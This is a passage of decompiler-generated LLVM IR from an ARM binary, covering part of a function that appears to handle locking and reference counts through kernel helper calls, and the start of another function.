  br i1 %v7_10860, label %dec_label_pc_10870, label %dec_label_pc_109d4

dec_label_pc_10870:                               ; preds = %dec_label_pc_10848
  store i32 80, i32* %r3.global-to-local, align 4
  %v0_10874 = load i32, i32* %r5.global-to-local, align 4
  %v2_10874 = add i32 %v0_10874, 80
  %v3_10874 = inttoptr i32 %v2_10874 to i32*
  %v4_10874 = load i32, i32* %v3_10874, align 4
  store i32 %v4_10874, i32* %r3.global-to-local, align 4
  %v1_10878 = inttoptr i32 %v4_10874 to i32*
  %v2_10878 = load i32, i32* %v1_10878, align 4
  store i32 %v2_10878, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp46 = icmp slt i32 %v2_10878, 1
  br i1 %tmp46, label %dec_label_pc_109d4, label %dec_label_pc_10884

dec_label_pc_10884:                               ; preds = %dec_label_pc_10870
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_10888 = add i32 %v0_10874, 152
  %v3_10888 = inttoptr i32 %v2_10888 to i32*
  %v4_10888 = load i32, i32* %v3_10888, align 4
  store i32 %v4_10888, i32* %r7.global-to-local, align 4
  %v1_1088c = add i32 %v4_10888, 8
  %v2_1088c = inttoptr i32 %v1_1088c to i32*
  %v3_1088c = load i32, i32* %v2_1088c, align 4
  store i32 %v3_1088c, i32* %r3.global-to-local, align 4
  %v1_10890 = load i32, i32* %r6.global-to-local, align 4
  %v3_10890 = icmp uge i32 %v3_1088c, %v1_10890
  store i1 %v3_10890, i1* %cpsr_c.global-to-local, align 1
  %v9_10890 = icmp eq i32 %v3_1088c, %v1_10890
  br i1 %v9_10890, label %dec_label_pc_108d4, label %dec_label_pc_10898

dec_label_pc_10898:                               ; preds = %dec_label_pc_10884
  store i32 %v4_10888, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_108a086 = inttoptr i32 %v4_10888 to i32*
  %v2_108a087 = load i32, i32* %v1_108a086, align 4
  store i32 %v2_108a087, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_108a489 = icmp eq i32 %v2_108a087, 0
  br i1 %v9_108a489, label %dec_label_pc_108ac, label %dec_label_pc_108c4

dec_label_pc_108ac:                               ; preds = %dec_label_pc_10898, %dec_label_pc_108ac.dec_label_pc_108a0_crit_edge
  %v0_108ac90 = phi i32 [ %v1_108a4.pre, %dec_label_pc_108ac.dec_label_pc_108a0_crit_edge ], [ 0, %dec_label_pc_10898 ]
  store i32 %v0_108ac90, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_108bc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_108bc, label %dec_label_pc_108c0, label %dec_label_pc_108ac.dec_label_pc_108a0_crit_edge

dec_label_pc_108ac.dec_label_pc_108a0_crit_edge:  ; preds = %dec_label_pc_108ac
  %v0_108a0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_108a4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_108a0 = inttoptr i32 %v0_108a0.pre to i32*
  %v2_108a0 = load i32, i32* %v1_108a0, align 4
  store i32 %v2_108a0, i32* %r3.global-to-local, align 4
  %v3_108a4 = icmp uge i32 %v2_108a0, %v1_108a4.pre
  store i1 %v3_108a4, i1* %cpsr_c.global-to-local, align 1
  %v9_108a4 = icmp eq i32 %v2_108a0, %v1_108a4.pre
  br i1 %v9_108a4, label %dec_label_pc_108ac, label %dec_label_pc_108c4

dec_label_pc_108c0:                               ; preds = %dec_label_pc_108ac
  %v0_108c0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_108c0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_108c4

dec_label_pc_108c4:                               ; preds = %dec_label_pc_10898, %dec_label_pc_108ac.dec_label_pc_108a0_crit_edge, %dec_label_pc_108c0
  %v0_108c4 = phi i32 [ %v0_108c0, %dec_label_pc_108c0 ], [ %v2_108a087, %dec_label_pc_10898 ], [ %v2_108a0, %dec_label_pc_108ac.dec_label_pc_108a0_crit_edge ]
  %v1_108c4 = phi i32 [ %v0_108c0, %dec_label_pc_108c0 ], [ 0, %dec_label_pc_10898 ], [ %v1_108a4.pre, %dec_label_pc_108ac.dec_label_pc_108a0_crit_edge ]
  %v3_108c4 = icmp uge i32 %v0_108c4, %v1_108c4
  store i1 %v3_108c4, i1* %cpsr_c.global-to-local, align 1
  %v9_108c4 = icmp eq i32 %v0_108c4, %v1_108c4
  br i1 %v9_108c4, label %bb48, label %bb47

bb47:                                             ; preds = %dec_label_pc_108c4
  %v1_108c8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_108c8, i32* %r0.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_108c4, %bb47
  %v1_108cc = xor i1 %v9_108c4, true
  call void @__pseudo_cond_branch(i1 %v1_108cc, i32 ptrtoint (i32* @global_var_e3fc.444 to i32))
  %v0_108d0 = load i32, i32* %r6.global-to-local, align 4
  %v1_108d0 = load i32, i32* %r7.global-to-local, align 4
  %v2_108d0 = add i32 %v1_108d0, 8
  %v3_108d0 = inttoptr i32 %v2_108d0 to i32*
  store i32 %v0_108d0, i32* %v3_108d0, align 4
  %v0_108dc.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_108d4

dec_label_pc_108d4:                               ; preds = %dec_label_pc_10884, %bb48
  %v0_108dc = phi i32 [ %v0_10874, %dec_label_pc_10884 ], [ %v0_108dc.pre, %bb48 ]
  store i32 152, i32* %r3.global-to-local, align 4
  store i32 76, i32* %r1.global-to-local, align 4
  %v2_108dc = add i32 %v0_108dc, 152
  %v3_108dc = inttoptr i32 %v2_108dc to i32*
  %v4_108dc = load i32, i32* %v3_108dc, align 4
  store i32 %v4_108dc, i32* %r0.global-to-local, align 4
  %v2_108e0 = add i32 %v0_108dc, 76
  %v3_108e0 = inttoptr i32 %v2_108e0 to i32*
  %v4_108e0 = load i32, i32* %v3_108e0, align 4
  store i32 %v4_108e0, i32* %r2.global-to-local, align 4
  %v1_108e4 = add i32 %v4_108dc, 4
  %v2_108e4 = inttoptr i32 %v1_108e4 to i32*
  %v3_108e4 = load i32, i32* %v2_108e4, align 4
  store i32 %v3_108e4, i32* %r3.global-to-local, align 4
  %v1_108e8 = inttoptr i32 %v4_108e0 to i32*
  %v2_108e8 = load i32, i32* %v1_108e8, align 4
  store i32 %v2_108e8, i32* %r2.global-to-local, align 4
  %v1_108ec = add i32 %v3_108e4, 1
  store i32 %v1_108ec, i32* %r3.global-to-local, align 4
  store i32 76, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v1_108ec, i32* %v2_108e4, align 4
  %v0_1093c.pr = load i32, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1093c11 = icmp eq i32 %v0_1093c.pr, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_1093c11, label %dec_label_pc_10948, label %dec_label_pc_10900

dec_label_pc_10900:                               ; preds = %dec_label_pc_108d4, %dec_label_pc_10938
  %v0_109242 = phi i32 [ %v0_10938, %dec_label_pc_10938 ], [ %v0_1093c.pr, %dec_label_pc_108d4 ]
  %v1_10900 = inttoptr i32 %v0_109242 to i16*
  %v2_10900 = load i16, i16* %v1_10900, align 2
  %v3_10900 = zext i16 %v2_10900 to i32
  store i32 %v3_10900, i32* %r3.global-to-local, align 4
  %v2_10904 = and i32 %v3_10900, 32816
  store i32 %v2_10904, i32* %r1.global-to-local, align 4
  %v2_10908 = icmp ugt i32 %v2_10904, 47
  store i1 %v2_10908, i1* %cpsr_c.global-to-local, align 1
  %v7_10908 = icmp eq i32 %v2_10904, 48
  %v1_1090c = add i32 %v0_109242, 32
  %v2_1090c = inttoptr i32 %v1_1090c to i32*
  %v3_1090c = load i32, i32* %v2_1090c, align 4
  store i32 %v3_1090c, i32* %r4.global-to-local, align 4
  br i1 %v7_10908, label %dec_label_pc_10918, label %.thread38

.thread38:                                        ; preds = %dec_label_pc_10900
  store i32 %v0_109242, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10938

dec_label_pc_10918:                               ; preds = %dec_label_pc_10900
  %v0_10918 = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10918 = icmp eq i32 %v0_10918, 0
  br i1 %v2_10918, label %.thread, label %bb49

.thread:                                          ; preds = %dec_label_pc_10918
  %v1_1091c = load i32, i32* %r5.global-to-local, align 4
  %v2_1091c = load i32, i32* %r7.global-to-local, align 4
  %v3_1091c = add i32 %v2_1091c, %v1_1091c
  %v4_1091c = inttoptr i32 %v3_1091c to i32*
  %v5_1091c = load i32, i32* %v4_1091c, align 4
  store i32 %v5_1091c, i32* %r3.global-to-local, align 4
  %v3_10920 = inttoptr i32 %v5_1091c to i32*
  store i32 %v3_1090c, i32* %v3_10920, align 4
  %v0_10924 = load i32, i32* %r2.global-to-local, align 4
  %v1_10924 = inttoptr i32 %v0_10924 to i16*
  %v2_10924 = load i16, i16* %v1_10924, align 2
  %v3_10924 = zext i16 %v2_10924 to i32
  store i32 %v3_10924, i32* %r3.global-to-local, align 4
  br label %bb50

bb49:                                             ; preds = %dec_label_pc_10918
  %v2_109248 = load i16, i16* %v1_10900, align 2
  %v3_109249 = zext i16 %v2_109248 to i32
  store i32 %v3_109249, i32* %r3.global-to-local, align 4
  %v3_10928 = add i32 %v0_10918, 32
  %v4_10928 = inttoptr i32 %v3_10928 to i32*
  store i32 %v3_1090c, i32* %v4_10928, align 4
  %v0_1092c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb50

bb50:                                             ; preds = %.thread, %bb49
  %v0_1092c = phi i32 [ %v3_10924, %.thread ], [ %v0_1092c.pre, %bb49 ]
  %v1_1092c = and i32 %v0_1092c, 8192
  %v2_1092c = icmp eq i32 %v1_1092c, 0
  br i1 %v2_1092c, label %bb52, label %bb51

bb51:                                             ; preds = %bb50
  %v1_10930 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_10930, i32* %r0.global-to-local, align 4
  br label %bb52

bb52:                                             ; preds = %bb50, %bb51
  %v1_10934 = xor i1 %v2_1092c, true
  call void @__pseudo_cond_branch(i1 %v1_10934, i32 ptrtoint (i32* @global_var_d458.137 to i32))
  %v0_10938.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10938

dec_label_pc_10938:                               ; preds = %.thread38, %bb52
  %v0_10938 = phi i32 [ %v0_10938.pre, %bb52 ], [ %v3_1090c, %.thread38 ]
  store i32 %v0_10938, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1093c = icmp eq i32 %v0_10938, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_1093c, label %dec_label_pc_10948, label %dec_label_pc_10900

dec_label_pc_10948:                               ; preds = %dec_label_pc_10938, %dec_label_pc_108d4
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_1094c = load i32, i32* %r5.global-to-local, align 4
  %v2_1094c = add i32 %v0_1094c, 152
  %v3_1094c = inttoptr i32 %v2_1094c to i32*
  %v4_1094c = load i32, i32* %v3_1094c, align 4
  store i32 %v4_1094c, i32* %r0.global-to-local, align 4
  %v1_10950 = add i32 %v4_1094c, 4
  %v2_10950 = inttoptr i32 %v1_10950 to i32*
  %v3_10950 = load i32, i32* %v2_10950, align 4
  %v1_10954 = add i32 %v3_10950, -1
  store i32 %v1_10954, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10958 = icmp eq i32 %v1_10954, 0
  store i32 %v1_10954, i32* %v2_10950, align 4
  br i1 %v2_10958, label %dec_label_pc_10964, label %dec_label_pc_109c4

dec_label_pc_10964:                               ; preds = %dec_label_pc_10948
  %v0_10964 = load i32, i32* %r3.global-to-local, align 4
  %v1_10964 = load i32, i32* %r0.global-to-local, align 4
  %v2_10964 = add i32 %v1_10964, 8
  %v3_10964 = inttoptr i32 %v2_10964 to i32*
  store i32 %v0_10964, i32* %v3_10964, align 4
  %v0_10968 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10968, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1096c

dec_label_pc_1096c:                               ; preds = %dec_label_pc_1099c.dec_label_pc_1096c_crit_edge, %dec_label_pc_10964
  %v0_1096c = phi i32 [ %v0_1096c.pre, %dec_label_pc_1099c.dec_label_pc_1096c_crit_edge ], [ %v0_10968, %dec_label_pc_10964 ]
  %v1_1096c = inttoptr i32 %v0_1096c to i32*
  %v2_1096c = load i32, i32* %v1_1096c, align 4
  store i32 %v2_1096c, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_1096c, i32* %r2.global-to-local, align 4
  %v2_1097874 = load i32, i32* %v1_1096c, align 4
  store i32 %v2_1097874, i32* %r3.global-to-local, align 4
  %v3_1097c76 = icmp uge i32 %v2_1097874, %v2_1096c
  store i1 %v3_1097c76, i1* %cpsr_c.global-to-local, align 1
  %v9_1097c82 = icmp eq i32 %v2_1097874, %v2_1096c
  br i1 %v9_1097c82, label %dec_label_pc_10984, label %dec_label_pc_1099c

dec_label_pc_10984:                               ; preds = %dec_label_pc_1096c, %dec_label_pc_10984.dec_label_pc_10978_crit_edge
  %v0_1098483 = phi i32 [ %v1_1097c.pre, %dec_label_pc_10984.dec_label_pc_10978_crit_edge ], [ %v2_1096c, %dec_label_pc_1096c ]
  store i32 %v0_1098483, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_10994 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_10994, label %dec_label_pc_10998, label %dec_label_pc_10984.dec_label_pc_10978_crit_edge

dec_label_pc_10984.dec_label_pc_10978_crit_edge:  ; preds = %dec_label_pc_10984
  %v0_10978.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1097c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_10978 = inttoptr i32 %v0_10978.pre to i32*
  %v2_10978 = load i32, i32* %v1_10978, align 4
  store i32 %v2_10978, i32* %r3.global-to-local, align 4
  %v3_1097c = icmp uge i32 %v2_10978, %v1_1097c.pre
  store i1 %v3_1097c, i1* %cpsr_c.global-to-local, align 1
  %v9_1097c = icmp eq i32 %v2_10978, %v1_1097c.pre
  br i1 %v9_1097c, label %dec_label_pc_10984, label %dec_label_pc_1099c

dec_label_pc_10998:                               ; preds = %dec_label_pc_10984
  %v0_10998 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10998, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1099c

dec_label_pc_1099c:                               ; preds = %dec_label_pc_1096c, %dec_label_pc_10984.dec_label_pc_10978_crit_edge, %dec_label_pc_10998
  %v0_109a4 = phi i32 [ %v0_10998, %dec_label_pc_10998 ], [ %v2_1097874, %dec_label_pc_1096c ], [ %v2_10978, %dec_label_pc_10984.dec_label_pc_10978_crit_edge ]
  %v1_1099c = phi i32 [ %v0_10998, %dec_label_pc_10998 ], [ %v2_1096c, %dec_label_pc_1096c ], [ %v1_1097c.pre, %dec_label_pc_10984.dec_label_pc_10978_crit_edge ]
  %v3_1099c = icmp uge i32 %v0_109a4, %v1_1099c
  store i1 %v3_1099c, i1* %cpsr_c.global-to-local, align 1
  %v9_1099c = icmp eq i32 %v0_109a4, %v1_1099c
  br i1 %v9_1099c, label %dec_label_pc_109a4, label %dec_label_pc_1099c.dec_label_pc_1096c_crit_edge

dec_label_pc_1099c.dec_label_pc_1096c_crit_edge:  ; preds = %dec_label_pc_1099c
  %v0_1096c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1096c

dec_label_pc_109a4:                               ; preds = %dec_label_pc_1099c
  %v2_109a4 = icmp ne i32 %v1_1099c, 0
  store i1 %v2_109a4, i1* %cpsr_c.global-to-local, align 1
  %v7_109a8 = icmp slt i32 %v1_1099c, 2
  br i1 %v7_109a8, label %dec_label_pc_109c4, label %dec_label_pc_109ac

dec_label_pc_109ac:                               ; preds = %dec_label_pc_109a4
  %v0_109ac = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_109ac, i32* %r0.global-to-local, align 4
  %v0_109b0 = load i32, i32* %r1.global-to-local, align 4
  %v1_109b0 = add i32 %v0_109b0, 129
  store i32 %v1_109b0, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_109c4

dec_label_pc_109c4:                               ; preds = %dec_label_pc_10948, %dec_label_pc_109ac, %dec_label_pc_109a4
  store i32 80, i32* %r3.global-to-local, align 4
  %v0_109c8 = load i32, i32* %r5.global-to-local, align 4
  %v2_109c8 = add i32 %v0_109c8, 80
  %v3_109c8 = inttoptr i32 %v2_109c8 to i32*
  %v4_109c8 = load i32, i32* %v3_109c8, align 4
  store i32 %v4_109c8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_109d0 = inttoptr i32 %v4_109c8 to i32*
  store i32 0, i32* %v2_109d0, align 4
  br label %dec_label_pc_109d4

dec_label_pc_109d4:                               ; preds = %dec_label_pc_10848, %dec_label_pc_10870, %dec_label_pc_109c4
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_109d8 = load i32, i32* %r5.global-to-local, align 4
  %v2_109d8 = add i32 %v0_109d8, 160
  %v3_109d8 = inttoptr i32 %v2_109d8 to i32*
  %v4_109d8 = load i32, i32* %v3_109d8, align 4
  store i32 %v4_109d8, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_109e0 = add i32 %v0_109d8, 12
  %v3_109e0 = inttoptr i32 %v2_109e0 to i32*
  %v4_109e0 = load i32, i32* %v3_109e0, align 4
  store i32 %v4_109e0, i32* %r1.global-to-local, align 4
  %v1_109e4 = add i32 %v4_109d8, 4
  %v2_109e4 = inttoptr i32 %v1_109e4 to i32*
  %v3_109e4 = load i32, i32* %v2_109e4, align 4
  store i32 %v3_109e4, i32* %r2.global-to-local, align 4
  %v1_109e8 = inttoptr i32 %v4_109e0 to i32*
  %v2_109e8 = load i32, i32* %v1_109e8, align 4
  %v1_109ec = add i32 %v3_109e4, -1
  store i32 %v1_109ec, i32* %r2.global-to-local, align 4
  %v1_109f0 = add i32 %v2_109e8, -1
  store i32 %v1_109f0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_109f4 = icmp eq i32 %v1_109ec, 0
  store i32 %v1_109f0, i32* %v1_109e8, align 4
  %v0_109fc = load i32, i32* %r2.global-to-local, align 4
  %v1_109fc = load i32, i32* %r0.global-to-local, align 4
  %v2_109fc = add i32 %v1_109fc, 4
  %v3_109fc = inttoptr i32 %v2_109fc to i32*
  store i32 %v0_109fc, i32* %v3_109fc, align 4
  br i1 %v2_109f4, label %dec_label_pc_10a04, label %dec_label_pc_10a64

dec_label_pc_10a04:                               ; preds = %dec_label_pc_109d4
  %v0_10a04 = load i32, i32* %r2.global-to-local, align 4
  %v1_10a04 = load i32, i32* %r0.global-to-local, align 4
  %v2_10a04 = add i32 %v1_10a04, 8
  %v3_10a04 = inttoptr i32 %v2_10a04 to i32*
  store i32 %v0_10a04, i32* %v3_10a04, align 4
  %v0_10a08 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10a08, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10a0c

dec_label_pc_10a0c:                               ; preds = %dec_label_pc_10a3c.dec_label_pc_10a0c_crit_edge, %dec_label_pc_10a04
  %v0_10a0c = phi i32 [ %v0_10a0c.pre, %dec_label_pc_10a3c.dec_label_pc_10a0c_crit_edge ], [ %v0_10a08, %dec_label_pc_10a04 ]
  %v1_10a0c = inttoptr i32 %v0_10a0c to i32*
  %v2_10a0c = load i32, i32* %v1_10a0c, align 4
  store i32 %v2_10a0c, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_10a0c, i32* %r2.global-to-local, align 4
  %v2_10a1862 = load i32, i32* %v1_10a0c, align 4
  store i32 %v2_10a1862, i32* %r3.global-to-local, align 4
  %v3_10a1c64 = icmp uge i32 %v2_10a1862, %v2_10a0c
  store i1 %v3_10a1c64, i1* %cpsr_c.global-to-local, align 1
  %v9_10a1c70 = icmp eq i32 %v2_10a1862, %v2_10a0c
  br i1 %v9_10a1c70, label %dec_label_pc_10a24, label %dec_label_pc_10a3c

dec_label_pc_10a24:                               ; preds = %dec_label_pc_10a0c, %dec_label_pc_10a24.dec_label_pc_10a18_crit_edge
  %v0_10a2471 = phi i32 [ %v1_10a1c.pre, %dec_label_pc_10a24.dec_label_pc_10a18_crit_edge ], [ %v2_10a0c, %dec_label_pc_10a0c ]
  store i32 %v0_10a2471, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_10a34 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_10a34, label %dec_label_pc_10a38, label %dec_label_pc_10a24.dec_label_pc_10a18_crit_edge

dec_label_pc_10a24.dec_label_pc_10a18_crit_edge:  ; preds = %dec_label_pc_10a24
  %v0_10a18.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_10a1c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_10a18 = inttoptr i32 %v0_10a18.pre to i32*
  %v2_10a18 = load i32, i32* %v1_10a18, align 4
  store i32 %v2_10a18, i32* %r3.global-to-local, align 4
  %v3_10a1c = icmp uge i32 %v2_10a18, %v1_10a1c.pre
  store i1 %v3_10a1c, i1* %cpsr_c.global-to-local, align 1
  %v9_10a1c = icmp eq i32 %v2_10a18, %v1_10a1c.pre
  br i1 %v9_10a1c, label %dec_label_pc_10a24, label %dec_label_pc_10a3c

dec_label_pc_10a38:                               ; preds = %dec_label_pc_10a24
  %v0_10a38 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10a38, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10a3c

dec_label_pc_10a3c:                               ; preds = %dec_label_pc_10a0c, %dec_label_pc_10a24.dec_label_pc_10a18_crit_edge, %dec_label_pc_10a38
  %v0_10a44 = phi i32 [ %v0_10a38, %dec_label_pc_10a38 ], [ %v2_10a1862, %dec_label_pc_10a0c ], [ %v2_10a18, %dec_label_pc_10a24.dec_label_pc_10a18_crit_edge ]
  %v1_10a3c = phi i32 [ %v0_10a38, %dec_label_pc_10a38 ], [ %v2_10a0c, %dec_label_pc_10a0c ], [ %v1_10a1c.pre, %dec_label_pc_10a24.dec_label_pc_10a18_crit_edge ]
  %v3_10a3c = icmp uge i32 %v0_10a44, %v1_10a3c
  store i1 %v3_10a3c, i1* %cpsr_c.global-to-local, align 1
  %v9_10a3c = icmp eq i32 %v0_10a44, %v1_10a3c
  br i1 %v9_10a3c, label %dec_label_pc_10a44, label %dec_label_pc_10a3c.dec_label_pc_10a0c_crit_edge

dec_label_pc_10a3c.dec_label_pc_10a0c_crit_edge:  ; preds = %dec_label_pc_10a3c
  %v0_10a0c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10a0c

dec_label_pc_10a44:                               ; preds = %dec_label_pc_10a3c
  %v2_10a44 = icmp ne i32 %v1_10a3c, 0
  store i1 %v2_10a44, i1* %cpsr_c.global-to-local, align 1
  %v7_10a48 = icmp slt i32 %v1_10a3c, 2
  br i1 %v7_10a48, label %dec_label_pc_10a64, label %dec_label_pc_10a4c

dec_label_pc_10a4c:                               ; preds = %dec_label_pc_10a44
  %v0_10a4c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_10a4c, i32* %r0.global-to-local, align 4
  %v0_10a50 = load i32, i32* %r1.global-to-local, align 4
  %v1_10a50 = add i32 %v0_10a50, 129
  store i32 %v1_10a50, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10a64

dec_label_pc_10a64:                               ; preds = %dec_label_pc_109d4, %dec_label_pc_10a4c, %dec_label_pc_10a44
  %v2_10a68 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_10a68, i32* %r4.global-to-local, align 4
  %v1_10a6c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_10a6c

; uselistorder directives
  uselistorder i32 %v0_10a38, { 1, 0, 2 }
  uselistorder i32 %v1_10a1c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_10a0c, { 1, 0 }
  uselistorder i32 %v0_10998, { 1, 0, 2 }
  uselistorder i32 %v1_1097c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1096c, { 1, 0 }
  uselistorder i32 %v0_10938, { 2, 1, 0 }
  uselistorder i32 %v0_108dc, { 1, 0 }
  uselistorder i32 %v0_108c0, { 1, 0, 2 }
  uselistorder i32 %v1_108a4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_10890, { 1, 0 }
  uselistorder i32 %v0_10834, { 1, 0, 2 }
  uselistorder i32 %v1_10818.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_107ec, { 2, 1, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 11, 10, 12, 14, 13, 15 }
  uselistorder i32* %r6.global-to-local, { 5, 6, 0, 1, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 6, 4, 5, 7 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 44, 4, 5, 6, 7, 8, 9, 10, 12, 11, 41, 13, 14, 15, 42, 43, 16, 17, 18, 19, 20, 21, 22, 24, 23, 39, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 35, 40, 37, 38 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 12, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 25, 26, 3, 4, 5, 6, 23, 24, 7, 10, 8, 9, 27, 11, 12, 19, 20, 13, 14, 15, 16, 17, 21, 22, 18 }
  uselistorder i32 240, { 0, 1, 2, 3, 7, 4, 5, 6 }
  uselistorder i32 47, { 2, 0, 3, 1 }
  uselistorder i32 32816, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10a64, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10a3c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10a24, { 1, 0 }
  uselistorder label %dec_label_pc_109d4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_109c4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1099c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10984, { 1, 0 }
  uselistorder label %dec_label_pc_10938, { 1, 0 }
  uselistorder label %bb52, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_10900, { 1, 0 }
  uselistorder label %dec_label_pc_108d4, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_108c4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_108ac, { 1, 0 }
  uselistorder label %dec_label_pc_10848, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %dec_label_pc_10838, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10820, { 1, 0 }
}

define i32 @function_10a74(i16* %arg1) local_unnamed_addr {
dec_label_pc_10a74:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_10a74 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10a74, label %bb, label %dec_label_pc_10a74..thread4_crit_edge

dec_label_pc_10a74..thread4_crit_edge:            ; preds = %dec_label_pc_10a74
  %v0_10aa0.pre = load i32, i32* %r0.global-to-local, align 4
  %v15_10a8c.pre = load i32, i32* @r8, align 4
  br label %.thread4

bb:                                               ; preds = %dec_label_pc_10a74
  store i32 0, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 0, i32* %r8.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_10a74..thread4_crit_edge, %bb
  %v15_10a8c = phi i32 [ %v15_10a8c.pre, %dec_label_pc_10a74..thread4_crit_edge ], [ 0, %bb ]
  %v0_10dec = phi i32 [ %v0_10aa0.pre, %dec_label_pc_10a74..thread4_crit_edge ], [ 0, %bb ]
  %v6_10a8c = load i32, i32* @r5, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* @r6, align 4
